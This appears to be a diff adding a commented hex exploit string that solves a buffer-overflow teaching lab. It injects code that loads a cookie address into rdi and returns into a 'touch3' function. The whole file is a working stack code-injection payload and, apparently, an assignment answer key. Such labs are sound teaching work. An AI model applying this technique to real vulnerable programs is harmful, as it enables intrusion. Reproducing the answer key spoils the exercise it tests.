@@ -1,0 +1,7 @@
+48 c7 c7 30 65 63 55 c3 /* injected code (move cookie address into rdi, then return) */
+2a 2a 2a 2a 2a 2a 2a 2a /* buffer filler */
+2a 2a 2a 2a 2a 2a 2a 2a
+08 65 63 55 00 00 00 00 /* address of injected code */           
+ba 19 40 00 00 00 00 00 /* touch3 address */
+34 32 33 32 32 33 37 33 /* cookie (ascii values) */
+00 00 00 00 00 00 00 00 /* need at least 1 00 to indicate end of cookie string */
